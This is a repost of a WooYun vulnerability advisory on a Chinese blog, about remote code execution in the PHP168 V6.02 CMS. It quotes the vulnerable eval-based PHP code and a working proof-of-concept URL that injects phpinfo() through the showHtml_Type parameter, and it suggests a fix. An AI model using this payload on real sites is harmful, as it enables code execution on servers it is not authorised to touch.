@@ -1,0 +1,671 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" >
+    <title>
+        
+        PHP168 V6.02整站系统远程执行任意代码漏洞 · \xeb\xfe&#39;s Blog
+        
+    </title>
+    <link rel="icon" href= /assests/favicon.ico>
+    <!-- TODO: 在font-face加载完毕后改变字体  -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/webfont/1.6.28/webfontloader.js"></script>
+<script>
+hljs.initHighlightingOnLoad();
+$('pre code').each(function(i, block) {
+  //hljs.highlightBlock(block);
+  var lines = $(this).text().split('\n').length - 1;
+  var $numbering = $('<ul/>').addClass('pre-numbering');
+  $(this)
+    .addClass('has-numbering')
+    .parent()
+    .append($numbering);
+  for(i=1;i<=lines;i++){
+    $numbering.append($('<li/>').text(i));
+  }
+});
+</script>
+<!-- UY BEGIN -->
+<div id="uyan_frame"></div>
+<script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=2151445"></script>
+<!-- UY END -->
+<style>
+code.has-numbering {
+  margin-left: 10px;
+  word-wrap: normal;
+  word-break: keep-all;
+  white-space: pre;
+}
+
+.pre-numbering {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 20px;
+  height: 100%;
+  padding: .5em 0.2em .5em 0;
+  border-right: 1px solid #C3CCD0;
+  border-radius: 3px 0 0 3px;
+  background-color: #EEE;
+  text-align: right;
+  font-size: 1.0em;
+  color: #AAA;
+  list-style: none;
+}
+@media (max-width: 767px) {
+  .pre-numbering {
+    display: none;
+  }
+  .has-numbering {
+    margin-left: -10px !important;
+    word-wrap: break-world !important;
+    white-space: pre-wrap !important;
+  }
+}
+overflow-x: auto;
+overflow-y: auto;
+word-break: keep-all;
+white-space: pre;
+</style>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.12.0/build/styles/default.min.css">
+<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.12.0/build/highlight.min.js"></script>
+    <!-- 提前加载place holder  -->
+    <style type="text/css">
+        @font-face {
+            font-family: 'Oswald-Regular';
+            src: url(/font/Oswald-Regular.ttf);
+        }
+    </style>
+    <style type="text/css">
+        .site-intro-placeholder {
+            position: absolute;
+            z-index: -2;
+            top: 0;
+            left: 0px;
+            width: calc(100% + 300px);
+            height: 100%;
+            background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+            background-position: center center;
+            transform: translate3d(-226px, 0, 0);
+            animation: gradient-move 2.5s ease-out 0s 1;
+        }
+        @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+    <link rel="stylesheet" href = /css/style.css?v=20171020 />
+    <script src="//cdn.staticfile.org/jquery/3.2.1/jquery.min.js" defer></script>
+    
+    <script src="/scripts/main.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >\xeb\xfe&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">PHP168 V6.02整站系统远程执行任意代码漏洞</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>\xeb\xfe's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-img" style="background-image: url(http://oumn0o088.bkt.clouddn.com/post-bg.jpg)"></div>
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            PHP168 V6.02整站系统远程执行任意代码漏洞
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <!-- 文章页标签  -->
+            
+                <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-href = wooyun-1000php>wooyun-1000php</a>
+    
+</div>
+            
+            <div class="post-intro-meta">
+                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                <span class="post-intro-time">2017/12/08</span>
+            </div>
+        
+    </div>
+</div>
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <script>
+            var browser = {
+                    versions: function () {
+                        var u = window.navigator.userAgent;
+                        return {
+                            userAgent: u,
+                            trident: u.indexOf('Trident') > -1, //IE内核
+                            presto: u.indexOf('Presto') > -1, //opera内核
+                            webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+                            gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+                            mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+                            ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+                            android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+                            iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+                            iPad: u.indexOf('iPad') > -1, //是否为iPad
+                            webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+                            weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+                            uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+                        };
+                    }()
+                }
+
+            function fontLoaded(){
+                console.log('font loaded');
+                if (document.getElementsByClassName('site-intro-meta')) {
+                    document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+                    document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+                    var postIntroTags = document.getElementsByClassName('post-intro-tags')[0],
+                        postIntroMeat = document.getElementsByClassName('post-intro-meta')[0];
+                        if (postIntroTags) {
+                            postIntroTags.classList.add('post-fade-in');
+                        }
+                        if (postIntroMeat) {
+                            postIntroMeat.classList.add('post-fade-in');
+                        }
+                    }
+                }
+                
+            console.log("userAgent:" + browser.versions.userAgent);
+            // UC不支持跨域，所以直接显示
+            if (browser.versions.uc) {
+                console.log("UCBrowser");
+                fontLoaded();
+            } else {
+                WebFont.load({
+                    custom: {
+                        families: ['Oswald-Regular']
+                    },
+                    loading: function () {  //所有字体开始加载
+                        // console.log('loading');
+                    },
+                    active: function () {  //所有字体已渲染
+                        fontLoaded();
+                    },
+                    inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+                        console.log('inactive: timeout');
+                        fontLoaded();
+                    },
+                    timeout: 7000 // Set the timeout to two seconds
+                });
+            }
+        </script>
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h3 id="简要描述"><a href="#简要描述" class="headerlink" title="简要描述"></a>简要描述</h3><p>PHP168 V6.02整站系统远程执行任意代码漏洞</p>
+<h3 id="详细说明"><a href="#详细说明" class="headerlink" title="详细说明"></a>详细说明</h3><p>漏洞出在inc/function.inc.php里面.get_html_url()这个函数.<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_html_url</span><span class="params">()</span></span>&#123;</span><br><span class="line"> <span class="keyword">global</span> $rsdb,$aid,$fidDB,$webdb,$fid,$page,$showHtml_Type,$Html_Type;</span><br><span class="line"> $id=$aid;</span><br><span class="line"> <span class="keyword">if</span>($page&lt;<span class="number">1</span>)&#123;</span><br><span class="line">  $page=<span class="number">1</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> $postdb[posttime]=$rsdb[posttime];</span><br><span class="line"> <span class="keyword">if</span>($showHtml_Type[bencandy][$id])&#123;</span><br><span class="line">  $filename_b=$showHtml_Type[bencandy][$id];</span><br><span class="line"> &#125;<span class="keyword">elseif</span>($fidDB[bencandy_html])&#123;</span><br><span class="line">  $filename_b=$fidDB[bencandy_html];</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  $filename_b=$webdb[bencandy_filename];</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="comment">//对于内容页的首页把$page去除</span></span><br><span class="line"> <span class="keyword">if</span>($page==<span class="number">1</span>)&#123;</span><br><span class="line">  $filename_b=preg_replace(<span class="string">"/(.*)(-&#123;\\\$page&#125;|_&#123;\\\$page&#125;)(.*)/is"</span>,<span class="string">"\\1\\3"</span>,$filename_b);</span><br><span class="line"> &#125;</span><br><span class="line"> $dirid=floor($aid/<span class="number">1000</span>);</span><br><span class="line"> <span class="comment">//对于内容页的栏目小于1000篇文章时,把DIR分目录去除</span></span><br><span class="line"> <span class="keyword">if</span>($dirid==<span class="number">0</span>)&#123;</span><br><span class="line">  $filename_b=preg_replace(<span class="string">"/(.*)(-&#123;\\\$dirid&#125;|_&#123;\\\$dirid&#125;)(.*)/is"</span>,<span class="string">"\\1\\3"</span>,$filename_b);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span>(strstr($filename_b,<span class="string">'$time_'</span>))&#123;</span><br><span class="line">  $time_Y=date(<span class="string">"Y"</span>,$postdb[posttime]);</span><br><span class="line">  $time_y=date(<span class="string">"y"</span>,$postdb[posttime]);</span><br><span class="line">  $time_m=date(<span class="string">"m"</span>,$postdb[posttime]);</span><br><span class="line">  $time_d=date(<span class="string">"d"</span>,$postdb[posttime]);</span><br><span class="line">  $time_W=date(<span class="string">"W"</span>,$postdb[posttime]);</span><br><span class="line">  $time_H=date(<span class="string">"H"</span>,$postdb[posttime]);</span><br><span class="line">  $time_i=date(<span class="string">"i"</span>,$postdb[posttime]);</span><br><span class="line">  $time_s=date(<span class="string">"s"</span>,$postdb[posttime]);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span>($fidDB[list_html])&#123;</span><br><span class="line">  $filename_l=$fidDB[list_html];</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  $filename_l=$webdb[list_filename];</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span>($page==<span class="number">1</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>($webdb[DefaultIndexHtml]==<span class="number">1</span>)&#123;</span><br><span class="line">   $filename_l=preg_replace(<span class="string">"/(.*)\/([^\/]+)/is"</span>,<span class="string">"\\1/index.html"</span>,$filename_l);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   $filename_l=preg_replace(<span class="string">"/(.*)\/([^\/]+)/is"</span>,<span class="string">"\\1/index.htm"</span>,$filename_l);</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">eval</span>(<span class="string">"\$array[_showurl]=\"$filename_b\";"</span>);</span><br><span class="line"> <span class="keyword">eval</span>(<span class="string">"\$array[_listurl]=\"$filename_l\";"</span>);</span><br><span class="line"> <span class="comment">//自定义了栏目域名</span></span><br><span class="line"> <span class="keyword">if</span>($Html_Type[domain][$fid]&amp;&amp;$Html_Type[domain_dir][$fid])&#123;</span><br><span class="line">  $rule=str_replace(<span class="string">"/"</span>,<span class="string">"\/"</span>,$Html_Type[domain_dir][$fid]);</span><br><span class="line">  $filename_b=preg_replace(<span class="string">"/^$rule/is"</span>,<span class="string">"&#123;$Html_Type[domain][$fid]&#125;/"</span>,$filename_b);</span><br><span class="line">  $filename_l=preg_replace(<span class="string">"/^$rule/is"</span>,<span class="string">"&#123;$Html_Type[domain][$fid]&#125;/"</span>,$filename_l);</span><br><span class="line">  <span class="comment">//特别处理一下些自定义内容页文件名的情况.</span></span><br><span class="line">  <span class="keyword">if</span>(!eregi(<span class="string">"^http:\/\/"</span>,$filename_b))&#123;</span><br><span class="line">   $filename_b=<span class="string">"$webdb[www_url]/$filename_b"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  $filename_b=<span class="string">"$webdb[www_url]/$filename_b"</span>;</span><br><span class="line">  $filename_l=<span class="string">"$webdb[www_url]/$filename_l"</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">eval</span>(<span class="string">"\$array[showurl]=\"$filename_b\";"</span>);</span><br><span class="line"> <span class="keyword">eval</span>(<span class="string">"\$array[listurl]=\"$filename_l\";"</span>);</span><br><span class="line"> <span class="keyword">return</span> $array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>代码第8-9行，当$showHtml_Type这个数组存在时,并且$showHtml_Type[bencandy][$id]不为空时，赋值$filename_b为$showHtml_Type[bencandy][$id].跟一下这个get_html_url()函数.</p>
+<p>在member/post.php中:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!$aid&amp;&amp;!$rid)&#123;</span><br><span class="line"> $aid=$id;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($rid)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">if</span>(!$aid)&#123;</span><br><span class="line">  showerr(<span class="string">"aid不存在!"</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> $erp=get_id_table($aid);</span><br><span class="line"> <span class="comment">//修改主题或修改多页都可</span></span><br><span class="line"> $rsdb=$db-&gt;get_one(<span class="string">"SELECT R.*,A.* FROM &#123;$pre&#125;article$erp A LEFT JOIN &#123;$pre&#125;reply$erp R ON A.aid=R.aid WHERE R.rid='$rid'"</span>);</span><br><span class="line"> $aid=$rsdb[aid];</span><br><span class="line"> $fid=$rsdb[fid];</span><br><span class="line"> $mid=$rsdb[mid];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>($aid)</span><br><span class="line">&#123;</span><br><span class="line"> $erp=get_id_table($aid);</span><br><span class="line"> <span class="comment">//只能是修改主题/续发文章</span></span><br><span class="line"> $rsdb=$db-&gt;get_one(<span class="string">"SELECT R.*,A.* FROM &#123;$pre&#125;article$erp A LEFT JOIN &#123;$pre&#125;reply$erp R ON A.aid=R.aid WHERE A.aid='$aid' ORDER BY R.rid ASC LIMIT 1"</span>);</span><br><span class="line"> <span class="keyword">isset</span>($fid) || $fid=$rsdb[fid];</span><br><span class="line"> $mid=$rsdb[mid];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//让用户选择栏目</span></span><br><span class="line"><span class="keyword">if</span>((!$fid&amp;&amp;!$only)||$jobs==<span class="string">"choose"</span>)</span><br><span class="line">&#123;</span><br><span class="line"> $sortdb=<span class="keyword">array</span>();</span><br><span class="line"> <span class="keyword">if</span>( $webdb[sortNUM]&gt;<span class="number">500</span>||$fid )&#123;</span><br><span class="line">  $rows=<span class="number">100</span>;</span><br><span class="line">  $page&lt;<span class="number">1</span> &amp;&amp; $page=<span class="number">1</span>;</span><br><span class="line">  $min=($page<span class="number">-1</span>)*$rows;</span><br><span class="line">  $showpage=getpage(<span class="string">"&#123;$pre&#125;sort"</span>,<span class="string">"WHERE fup='$fid'"</span>,<span class="string">"?lfj=$lfj&amp;job=$job&amp;jobs=$jobs&amp;only=$only&amp;mid=$mid&amp;fid=$fid"</span>,$rows);</span><br><span class="line">  $query = $db-&gt;query(<span class="string">"SELECT * FROM &#123;$pre&#125;sort WHERE fup='$fid' ORDER BY list DESC,fid ASC LIMIT $min,$rows"</span>);</span><br><span class="line">  <span class="keyword">while</span>($rs = $db-&gt;fetch_array($query))&#123;</span><br><span class="line">   $rs[post]=$rs[NUM]=$rs[do_art]=<span class="string">''</span>;</span><br><span class="line">   $detail_admin=@explode(<span class="string">","</span>,$rs[admin]);</span><br><span class="line">   $detail_allowpost=@explode(<span class="string">","</span>,$rs[allowpost]);</span><br><span class="line">   <span class="keyword">if</span>(!$rs[type]&amp;&amp;( $web_admin||($lfjid&amp;&amp;@in_array($lfjid,$detail_admin))||@in_array($groupdb[<span class="string">'gid'</span>],$detail_allowpost) ))</span><br><span class="line">   &#123; </span><br><span class="line">    $erp=$Fid_db[iftable][$rs[fid]];</span><br><span class="line">    $_rs=$db-&gt;get_one(<span class="string">"SELECT COUNT(*) AS NUM FROM &#123;$pre&#125;article$erp WHERE fid='$rs[fid]' AND uid='$lfjuid'"</span>);</span><br><span class="line">    <span class="keyword">if</span>($_rs[NUM]&amp;&amp;$lfjid)&#123;</span><br><span class="line">     $rs[NUM]=<span class="string">"( &lt;b&gt;&#123;$_rs[NUM]&#125;&lt;/b&gt; )"</span>;</span><br><span class="line">     $rs[do_art]=<span class="string">"&lt;A HREF='myarticle.php?job=myarticle&amp;fid=$rs[fid]' class='manage_article'&gt;管理&lt;/A&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $rs[post]=<span class="string">"&lt;A HREF='?job=postnew&amp;fid=$rs[fid]' class='post_article'&gt;发表&lt;/A&gt;"</span>;</span><br><span class="line">    $allowpost++;</span><br><span class="line">   &#125;</span><br><span class="line">   $sortdb[]=$rs;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>($fid)&#123;</span><br><span class="line">   $show_guide=<span class="string">"&lt;A HREF='?lfj=$lfj&amp;jobs=$jobs&amp;job=$job&amp;only=$only&amp;mid=$mid'&gt;返回顶级目录&lt;/A&gt; "</span>.list_sort_guide($fid);</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">  list_post_allsort();</span><br><span class="line">  <span class="keyword">if</span>(!$allowpost)&#123;</span><br><span class="line">   showerr(<span class="string">"你所在用户组无权发表文章"</span>,<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> $MSG=<span class="string">"请选择一个栏目投稿"</span>;</span><br><span class="line"> <span class="keyword">require</span>(dirname(<span class="keyword">__FILE__</span>).<span class="string">"/"</span>.<span class="string">"head.php"</span>);</span><br><span class="line"> <span class="keyword">require</span>(dirname(<span class="keyword">__FILE__</span>).<span class="string">"/"</span>.<span class="string">"template/post_set.htm"</span>);</span><br><span class="line"> <span class="keyword">require</span>(dirname(<span class="keyword">__FILE__</span>).<span class="string">"/"</span>.<span class="string">"foot.php"</span>);</span><br><span class="line"> <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($fid||$step)&#123;</span><br><span class="line"> $fidDB=$db-&gt;get_one(<span class="string">"SELECT * FROM &#123;$pre&#125;sort WHERE fid='$fid'"</span>);</span><br><span class="line"> !$fidDB &amp;&amp; showerr(<span class="string">"栏目有误"</span>);</span><br><span class="line"> $fidDB[type]!=<span class="number">0</span> &amp;&amp; showerr(<span class="string">"你只能选择子栏目发表内容!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$job==<span class="string">'postnew'</span> &amp;&amp; !$mid &amp;&amp; $mid=$fidDB[fmid];</span><br><span class="line"><span class="keyword">if</span>($lfjid&amp;&amp;@in_array($lfjid,explode(<span class="string">','</span>,$fidDB[admin])))</span><br><span class="line">&#123;</span><br><span class="line"> $web_admin=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($fidDB&amp;&amp;!$web_admin&amp;&amp;!in_array($groupdb[gid],explode(<span class="string">','</span>,$fidDB[allowpost])))</span><br><span class="line">&#123;</span><br><span class="line"> showerr(<span class="string">"你所在用户组无权在本栏目“&#123;$fidDB[name]&#125;”有任何操作"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!$lfjid&amp;&amp;$job!=<span class="string">'postnew'</span>)</span><br><span class="line">&#123;</span><br><span class="line"> showerr(<span class="string">"游客无权操作"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$atc_power=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>($lfjid)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">if</span>($web_admin||$lfjuid==$rsdb[uid])&#123;</span><br><span class="line">	$atc_power=<span class="number">1</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">$uid=<span class="keyword">isset</span>($rsdb[uid])?$rsdb[uid]:$lfjuid;</span><br><span class="line"><span class="keyword">if</span>($job==<span class="string">'endHTML'</span>)</span><br><span class="line">&#123;</span><br><span class="line"> $htmlurldb=get_html_url();</span><br><span class="line"> <span class="comment">//首页生成静态</span></span><br><span class="line"> @unlink(PHP168_PATH.<span class="string">"index.htm.bak"</span>);</span><br><span class="line"> rename(PHP168_PATH.<span class="string">"index.htm"</span>,PHP168_PATH.<span class="string">"index.htm.bak"</span>);</span><br><span class="line"> refreshto(<span class="string">"myarticle.php?job=myarticle&amp;mid=$mid&amp;only=$only"</span>,<span class="string">"&lt;CENTER&gt;[&lt;A HREF='?job=postnew&amp;fid=$fid&amp;mid=$mid&amp;only=$only'&gt;发表新主题&lt;/A&gt;] [&lt;A HREF='?job=post_more&amp;aid=$aid&amp;mid=$mid&amp;only=$only'&gt;续发本主题&lt;/A&gt;] [&lt;A HREF='myarticle.php?job=myarticle&amp;fid=$fid&amp;mid=$mid&amp;only=$only'&gt;返回文章列表&lt;/A&gt;] [&lt;A HREF='&#123;$htmlurldb[showurl]&#125;' target=_blank&gt;查看文章&lt;/A&gt;] [&lt;A HREF='?job=manage&amp;aid=$aid&amp;mid=$mid&amp;only=$only'&gt;修改文章&lt;/A&gt;]&lt;/CENTER&gt;"</span>,<span class="number">60</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>第25行代码，当only或者fid不等于0时,且job等于”endHTML”时,执行函数get_html_url.由于$showHtml_Type数组和$aid是可以由我们赋值的,所以漏洞产生.</p>
+<h3 id="漏洞证明"><a href="#漏洞证明" class="headerlink" title="漏洞证明"></a>漏洞证明</h3><p>先注册一个会员,登陆后在地址栏提交:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://**.**.**.**/member/post.php?only=1&amp;showHtml_Type[bencandy][1]=&#123;$&#123;phpinfo()&#125;&#125;&amp;aid=1&amp;job=endHTML</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2017/12/08/wooyun-1000php-9/1.png" alt=""></p>
+<h3 id="修复方案："><a href="#修复方案：" class="headerlink" title="修复方案："></a>修复方案：</h3><p>初始化$showHtml_Type数组.</p>
+<p>原文链接：<a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2010-0528.html" target="_blank" rel="noopener">PHP168 V6.02整站系统远程执行任意代码漏洞</a></p>
+
+    </article>
+    <!-- 前后页  -->
+    <ul class="post-pager">
+        
+            <li class="next">
+                <a href= "/2017/12/08/wooyun-1000php-10/" title= HZCMS 合正网站群内容管理系统SQL注射漏洞 >
+                    <span>往前一页</span>
+                    <span>HZCMS 合正网站群内容管理系统SQL注射漏洞</span>
+                </a>
+            </li>
+        
+        
+            <li class="previous">
+                <a href= "/2017/12/08/wooyun-1000php-8/" title= phpcms2008本地文件包括及利用（执行任意SQL脚本） >
+                    <span>往后一页</span>
+                    <span>phpcms2008本地文件包括及利用（执行任意SQL脚本）</span>
+                </a>
+            </li>
+        
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC版-->
+
+    <!--PC版-->
+
+    <!-- UY BEGIN -->
+    <div id="uyan_frame"></div>
+    <script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=2151445"></script>
+    <!-- UY END -->
+
+
+    
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:447344932@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/doge-dog" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">Theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+        <span id="busuanzi_container_site_pv">Welcome, No. <span id="busuanzi_value_site_uv"></span> visitor.
+        </span>
+    </div>
+    
+
+
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper">
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#简要描述"><span class="toc-number">1.</span> <span class="toc-text">简要描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#详细说明"><span class="toc-number">2.</span> <span class="toc-text">详细说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞证明"><span class="toc-number">3.</span> <span class="toc-text">漏洞证明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修复方案："><span class="toc-number">4.</span> <span class="toc-text">修复方案：</span></a></li></ol>
+    </div>
+    
+    <div class="back-top">&#xe639;</div>
+    <div class="sidebar">
+    <div class="sidebar-header sidebar-header-show-archive">
+        <div class="sidebar-category">
+
+            <span class="sidebar-archive-link"><span class="iconfont-archer">&#xe67d;</span>archive</span>
+            <span class="sidebar-tags-link"><span class="iconfont-archer">&#xe610;</span>tags</span>
+
+        </div>
+    </div>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-archive">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
